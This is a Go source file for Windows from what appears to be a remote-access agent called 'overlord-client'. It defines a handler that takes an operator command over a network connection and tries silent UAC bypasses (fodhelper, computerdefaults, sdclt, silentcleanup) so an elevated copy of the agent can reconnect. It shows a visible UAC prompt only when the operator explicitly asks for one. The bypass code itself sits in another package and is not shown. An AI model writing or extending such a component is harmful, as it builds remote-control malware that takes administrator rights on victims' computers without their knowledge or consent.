//go:build windows

package handlers

import (
	"context"
	"fmt"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"

	"overlord-client/cmd/agent/mutex"
	"overlord-client/cmd/agent/privesc"
	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

var (
	modShell32       = windows.NewLazySystemDLL("shell32.dll")
	procShellExecute = modShell32.NewProc("ShellExecuteExW")
)

const (
	_SEE_MASK_NOCLOSEPROCESS = 0x00000040
	_SEE_MASK_NOASYNC        = 0x00000100
	_SW_HIDE                 = 0
)

type shellExecuteInfo struct {
	cbSize       uint32
	fMask        uint32
	hwnd         uintptr
	lpVerb       *uint16
	lpFile       *uint16
	lpParameters *uint16
	lpDirectory  *uint16
	nShow        int32
	hInstApp     uintptr
	lpIDList     uintptr
	lpClass      *uint16
	hkeyClass    uintptr
	dwHotKey     uint32
	hIcon        uintptr
	hProcess     uintptr
}

// HandleElevate attempts silent UAC bypass. If a specific method is named in
// the password field ("fodhelper", "computerdefaults", "sdclt", "silentcleanup")
// that method is tried first; otherwise the full chain runs.
// Falls back to a visible UAC prompt only when method="prompt" is explicitly passed.
func HandleElevate(ctx context.Context, env *agentRuntime.Env, cmdID string, password string) error {
	token := windows.GetCurrentProcessToken()
	if token.IsElevated() {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        true,
			Message:   "already running as admin",
		})
	}

	method := strings.ToLower(strings.TrimSpace(password))

	// Explicit request for the UAC prompt dialog.
	if method == "prompt" {
		return elevateViaPrompt(ctx, env, cmdID)
	}

	// Silent bypass — spawns an elevated copy and exits this process.
	// This function does not return if successful (os.Exit(0) inside bypass).
	_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        true,
		Message:   fmt.Sprintf("attempting silent UAC bypass (method=%q); elevated copy will reconnect", method),
	})

	mutex.ReleaseGlobal()
	privesc.TryNamedBypass(method)

	// If we reach here all silent methods failed.
	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        false,
		Message:   "all silent UAC bypass methods failed; pass method=\"prompt\" to show UAC dialog",
	})
}

// elevateViaPrompt shows the standard Windows UAC dialog.
// Only used when explicitly requested (method="prompt").
func elevateViaPrompt(ctx context.Context, env *agentRuntime.Env, cmdID string, args ...string) error {
	exePath, err := os.Executable()
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: false,
			Message: fmt.Sprintf("failed to resolve executable path: %v", err),
		})
	}

	var params *uint16
	if len(args) > 0 && args[0] != "" {
		params, _ = windows.UTF16PtrFromString(args[0])
	}
	verb, _ := windows.UTF16PtrFromString("runas")
	file, _ := windows.UTF16PtrFromString(exePath)

	sei := shellExecuteInfo{
		fMask:        _SEE_MASK_NOCLOSEPROCESS | _SEE_MASK_NOASYNC,
		lpVerb:       verb,
		lpFile:       file,
		lpParameters: params,
		nShow:        _SW_HIDE,
	}
	sei.cbSize = uint32(unsafe.Sizeof(sei))

	r1, _, lastErr := procShellExecute.Call(uintptr(unsafe.Pointer(&sei)))
	if r1 == 0 {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: false,
			Message: fmt.Sprintf("UAC prompt elevation failed: %v", lastErr),
		})
	}

	mutex.ReleaseGlobal()
	_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type: "command_result", CommandID: cmdID, OK: true,
		Message: "elevated process started via UAC prompt",
	})
	return nil
}
